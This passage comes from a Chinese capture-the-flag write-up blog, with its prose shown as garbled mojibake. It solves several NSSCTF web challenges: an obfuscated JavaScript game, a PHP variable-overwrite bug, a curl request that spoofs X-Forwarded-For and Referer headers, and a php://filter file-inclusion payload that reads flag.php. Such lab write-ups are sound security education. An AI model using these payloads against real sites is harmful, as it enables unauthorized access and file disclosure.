escape_">\x73</span><span class="char escape_">\x69</span><span class="char escape_">\x74</span><span class="char escape_">\x69</span><span class="char escape_">\x6F</span><span class="char escape_">\x6E</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x79</span><span class="char escape_">\x6C</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x74</span><span class="char escape_">\x69</span><span class="char escape_">\x76</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x74</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x63</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x61</span><span class="char escape_">\x74</span><span class="char escape_">\x65</span><span class="char escape_">\x54</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x67</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x63</span><span class="char escape_">\x68</span><span class="char escape_">\x65</span><span class="char escape_">\x63</span><span class="char escape_">\x6B</span><span class="char escape_">\x66</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x67</span><span class="char escape_">\x31</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x63</span><span class="char escape_">\x68</span><span class="char escape_">\x65</span><span class="char escape_">\x63</span><span class="char escape_">\x6B</span><span class="char escape_">\x66</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x67</span><span class="char escape_">\x32</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x6F</span><span class="char escape_">\x70</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x6D</span><span class="char escape_">\x6F</span><span class="char escape_">\x65</span><span class="char escape_">\x63</span><span class="char escape_">\x74</span><span class="char escape_">\x66</span><span class="char escape_">\x7B</span><span class="char escape_">\x4F</span><span class="char escape_">\x68</span><span class="char escape_">\x5F</span><span class="char escape_">\x79</span><span class="char escape_">\x6F</span><span class="char escape_">\x75</span><span class="char escape_">\x5F</span><span class="char escape_">\x63</span><span class="char escape_">\x61</span><span class="char escape_">\x6E</span><span class="char escape_">\x5F</span><span class="char escape_">\x61</span><span class="char escape_">\x31</span><span class="char escape_">\x6D</span><span class="char escape_">\x5F</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\u4F60</span><span class="char escape_">\u5DF2</span><span class="char escape_">\u7ECF</span><span class="char escape_">\u5B66</span><span class="char escape_">\u4F1A</span><span class="char escape_">\u7784</span><span class="char escape_">\u51C6</span><span class="char escape_">\u4E86</span><span class="char escape_">\uFF01</span><span class="char escape_">\u8BD5</span><span class="char escape_">\u8BD5</span><span class="char escape_">\u770B</span><span class="char escape_">\x3A</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x74</span><span class="char escape_">\x32</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x6E</span><span class="char escape_">\x64</span><span class="char escape_">\x5F</span><span class="char escape_">\x48</span><span class="char escape_">\x34</span><span class="char escape_">\x63</span><span class="char escape_">\x6B</span><span class="char escape_">\x5F</span><span class="char escape_">\x4A</span><span class="char escape_">\x61</span><span class="char escape_">\x76</span><span class="char escape_">\x61</span><span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x72</span><span class="char escape_">\x69</span><span class="char escape_">\x70</span><span class="char escape_">\x74</span><span class="char escape_">\x7D</span>&quot;</span>, <span class="string">&quot;&quot;</span>];</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AimTrainer</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(&#123;_0<span class="params">xf777x2</span>, _0<span class="params">xf777x3</span>&#125;) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]] <span class="operator">=</span> <span class="variable">document</span>[<span class="variable">_0x78bd</span>[<span class="number">2</span>]](<span class="variable">_0x78bd</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]] <span class="operator">=</span> <span class="variable">document</span>[<span class="variable">_0x78bd</span>[<span class="number">2</span>]](<span class="variable">_0x78bd</span>[<span class="number">4</span>]);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]] <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]] <span class="operator">=</span> <span class="variable">_0xf777x2</span> <span class="operator">||</span> <span class="number">1000</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">7</span>]] <span class="operator">=</span> <span class="variable">_0xf777x3</span> <span class="operator">||</span> <span class="number">30</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">8</span>]] <span class="operator">=</span> <span class="variable">document</span>[<span class="variable">_0x78bd</span>[<span class="number">2</span>]](<span class="variable">_0x78bd</span>[<span class="number">5</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createTarget</span>() &#123;</span><br><span class="line">        <span class="variable">const</span> <span class="variable">_0xf777x5</span> <span class="operator">=</span> <span class="variable">new</span> <span class="title class_">Target</span>(&#123;</span><br><span class="line">            <span class="variable">delay</span>: <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]],</span><br><span class="line">            <span class="variable">targetSize</span>: <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">7</span>]],</span><br><span class="line">            <span class="variable">aimTrainerEl</span>: <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]],</span><br><span class="line">            <span class="variable">onTargetHit</span>: () <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">9</span>]](<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">+</span> <span class="number">1</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable">_0xf777x5</span>[<span class="variable">_0x78bd</span>[<span class="number">10</span>]]()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setScore</span>(_0<span class="params">xf777x7</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">=</span> <span class="variable">_0xf777x7</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setAimScore</span>(_0<span class="params">xf777x7</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]] <span class="operator">=</span> <span class="variable">_0xf777x7</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">8</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable">_0xf777x7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">start1</span>() &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">9</span>]](<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">12</span>]](<span class="number">10</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]][<span class="variable">_0x78bd</span>[<span class="number">14</span>]][<span class="variable">_0x78bd</span>[<span class="number">13</span>]] <span class="operator">=</span> <span class="variable">_0x78bd</span>[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span><span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]] <span class="operator">=</span> <span class="title function_">setInterval</span>( () <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">17</span>]]();</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]];</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">18</span>]]()</span><br><span class="line">            &#125;</span><br><span class="line">            , <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">start2</span>() &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">7</span>]] <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]] <span class="operator">=</span> <span class="number">400</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">9</span>]](<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">12</span>]](<span class="number">100000</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]][<span class="variable">_0x78bd</span>[<span class="number">14</span>]][<span class="variable">_0x78bd</span>[<span class="number">13</span>]] <span class="operator">=</span> <span class="variable">_0x78bd</span>[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span><span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]] <span class="operator">=</span> <span class="title function_">setInterval</span>( () <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">17</span>]]();</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]];</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">19</span>]]()</span><br><span class="line">            &#125;</span><br><span class="line">            , <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">checkflag1</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">==</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">20</span>]]();</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable">_0x78bd</span>[<span class="number">21</span>]);</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable">_0x78bd</span>[<span class="number">22</span>]);</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">23</span>]]()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">checkflag2</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">==</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">20</span>]]();</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable">_0x78bd</span>[<span class="number">24</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">stop</span>() &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable">_0x78bd</span>[<span class="number">25</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]) &#123;</span><br><span class="line">            <span class="title function_">clearInterval</span>(<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]);</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]] <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªcheckflagå‡½æ•°ï¼Œéƒ½æ˜¯æ‰§è¡Œäº†alertå‡½æ•°åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ï¼Œå¾—åˆ°ä¸€åŠçš„flag<br><img src="https://pic1.imgdb.cn/item/67baab6bd0e0a243d4026d17.png"><br>å†è¾“å…¥ç¬¬äºŒä¸ªcheckflagä¸­çš„alertå‡½æ•°å¾—åˆ°å¦ä¸€åŠflag<br><img src="https://pic1.imgdb.cn/item/67baabadd0e0a243d4026d2d.png"><br>å¦‚æœåœ¨NSSä¸­åšé¢˜å‰é¢è¦æ”¹æˆNSSCTF</p>
<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€é“å˜é‡è¦†ç›–çš„é¢˜ï¼Œå¿…é¡»ç”¨getå’Œpostä¼ å…¥flagå‚æ•°ï¼Œä½†æ˜¯å€¼ä¸èƒ½éƒ½æ˜¯flag<br>ç„¶åforeachä¸­çš„å†…å®¹æ„æ€æ˜¯æŠŠå…¶ä¸­çš„é”®å€¼å¯¹è½¬æ¢ä¸ºå˜é‡ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¯·æ±‚æ˜¯ POST flag&#x3D;123ï¼Œé‚£ä¹ˆ <code>$flag</code> &#x3D; â€˜123â€™;<br>è¿™é‡Œæœ€åä¸€ä¸ªè¦†ç›–æ˜¯getè¯·æ±‚ï¼Œæˆ‘ä»¬å°±åˆ©ç”¨ä¸€ä¸ªä¸­é—´çš„å˜é‡xï¼Œè®©x&#x3D;flag,è¿™æ ·å­xå°±ä¼šå˜æˆæˆ‘ä»¬éœ€è¦çš„æœ€åŸå§‹çš„flag<br>ç„¶åå†è®©flag&#x3D;x è¿™æ ·å­å°±é¿å…äº†æœ€åˆçš„flagè¢«æˆ‘ä»¬è¾“å…¥çš„flagè¦†ç›–äº†<br><img src="https://pic1.imgdb.cn/item/67bab120d0e0a243d4026ed8.png"></p>
<h1 id="ezhtml"><a href="#ezhtml" class="headerlink" title="ezhtml"></a>ezhtml</h1><p><img src="https://pic1.imgdb.cn/item/67bab1d9d0e0a243d4026ef0.png"><br>æŸ¥çœ‹æºä»£ç ï¼Œæœ€æœ‰æœ‰ä¸€ä¸ªevil.jsè¿™æ˜¯æ ¡éªŒé€»è¾‘ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sx = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#sx&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> yw = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#yw&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> wy = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#wy&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> zh = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#zh&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> zf = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#zf&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> arr = [sx, yw, wy, zh];</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        sum += <span class="built_in">eval</span>(arr[i].<span class="property">innerHTML</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sum == <span class="built_in">eval</span>(zf.<span class="property">innerHTML</span>) &amp;&amp; sum &gt; <span class="number">600</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;NSSCTF&#123;91e26cae-0c3a-40c2-b6b8-9a7ffb431d26&#125;&#x27;</span>);</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setInterval</span>(check, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></div>
<p>ç›´æ¥å¾—åˆ°flagäº†ï¼Œè¿™é‡Œè¿˜è¦sumå¤§äº600ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‰f12ä¿®æ”¹è¿™äº›æˆç»©,è¦æŠŠå•ç§‘å’Œæ€»åˆ†ä¸€èµ·æ”¹ï¼Œæ€»åˆ†è¦ç­‰äºæ€»å’Œ<br><img src="https://pic1.imgdb.cn/item/67bab445d0e0a243d4026f61.png"></p>
<h1 id="cookiehead"><a href="#cookiehead" class="headerlink" title="cookiehead"></a>cookiehead</h1><p>é¢˜ç›®ç•Œé¢åªæœ‰<code>ä»…é™æœ¬åœ°è®¿é—®</code><br>å°±åœ¨è¯·æ±‚å¤´è¿™é‡ŒåŠ å…¥xff ä¼ªé€ æœ¬åœ°<br>ç„¶åæç¤º<code>You are not from http://127.0.0.1/index.php !</code><br>æ‰€ä»¥åŠ ä¸ŠReferer<br>æœ€åæç¤º<code>è¯·å…ˆç™»å½•</code><br>å†æŠŠlogin æ”¹æˆ1</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://node5.anna.nssctf.cn:25883/ -H <span class="string">&#x27;X-Forwarded-For 127.0.0.1&#x27;</span> -H <span class="string">&#x27;Referer http://127.0.0.1/index.php&#x27;</span> -H <span class="string">&#x27;login 1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="baby-file"><a href="#baby-file" class="headerlink" title="baby_file"></a>baby_file</h1><p>é¢˜ç›®</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Here&#x27;s a secret. Can you find it?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span></span><br><span class="line"><span class="language-php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line">PD9waHANCkhleSBoZXksIHJlYWNoIHRoZSBoaWdoZXN0IGNpdHkgaW4gdGhlIHdvcmxkISBBY3R1YWxseSBJIGFtIGlrdW4hITsNCg0KTlNTQ1RGe2FkNWI4ZGNiLWZkMDctNDk5MS05MDJiLTYwYWFhMWRjODgyNn07DQoNCj8+</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># echo PD9waHANCkhleSBoZXksIHJlYWNoIHRoZSBoaWdoZXN0IGNpdHkgaW4gdGhlIHdvcmxkISBBY3R1YWxseSBJIGFtIGlrdW4hITsNCg0KTlNTQ1RGe2FkNWI4ZGNiLWZkMDctNDk5MS05MDJiLTYwYWFhMWRjODgyNn07DQoNCj8+ | base64 -d                                </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Hey hey, reach the highest city in the world! Actually I am ikun!!;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;ad5b8dcb-fd07-<span class="number">4991</span>-<span class="number">902</span>b-<span class="number">60</span>aaa1dc8826&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure></div>

<h1 id="æ”¯ä»˜ç³»ç»Ÿ"><a href="#æ”¯ä»˜ç³»ç»Ÿ" class="headerlink" title="æ”¯ä»˜ç³»ç»Ÿ"></a>æ”¯ä»˜ç³»ç»Ÿ</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> quart <span class="keyword">import</span> Quart, render_template, redirect, jsonify, request, session</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> pbkdf2_hmac</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> IntEnum</span><br><span class="line"><span class="keyword">from</span> tortoise <span class="keyword">import</span> fields</span><br><span class="line"><span class="keyword">from</span> tortoise.models <span class="keyword">import</span> Model</span><br><span class="line"><span class="keyword">from</span> tortoise.contrib.quart <span class="keyword">import</span> register_tortoise</span><br><span class="line"><span class="keyword">from</span> httpx <span class="keyword">import</span> AsyncClient</span><br><span class="line"></span><br><span class="line">app = Quart(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransactionStatus</span>(<span class="title class_ inherited__">IntEnum</span>):</span><br><span class="line">    SUCCESS = <span class="number">0</span></span><br><span class="line">    PENDING = <span class="number">1</span></span><br><span class="line">    FAILED = <span class="number">2</span></span><br><span class="line">    TIMEOUT = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transaction</span>(<span class="title class_ inherited__">Model</span>):</span><br><span class="line">    <span class="built_in">id</span> = fields.IntField(pk=<span class="literal">True</span>)</span><br><span class="line">    user = fields.UUIDField()</span><br><span class="line">    amount = fields.IntField()</span><br><span class="line">    status = fields.IntEnumField(TransactionStatus)</span><br><span class="line">    desc = fields.TextField()</span><br><span class="line">    <span class="built_in">hash</span> = fields.CharField(<span class="number">64</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="variable language_">self</span>.__setattr__(k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">do_callback</span>(<span class="params">transaction: Transaction</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> AsyncClient() <span class="keyword">as</span> ses:</span><br><span class="line">        transaction.status = <span class="built_in">int</span>(TransactionStatus.FAILED)</span><br><span class="line">        data = (</span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.user&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.amount&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.status&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.desc&#125;</span>&#x27;</span></span><br><span class="line">        ).encode()</span><br><span class="line">        <span class="keyword">await</span> ses.post(<span 